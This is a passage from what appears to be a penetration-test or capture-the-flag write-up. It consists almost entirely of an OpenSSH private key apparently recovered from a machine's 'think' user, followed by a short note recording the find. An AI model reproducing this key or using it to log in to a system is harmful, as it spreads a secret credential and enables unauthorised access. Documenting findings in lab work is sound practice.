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
-----END OPENSSH PRIVATE KEY-----
```

> [!note]
> Found private SSH key of think user

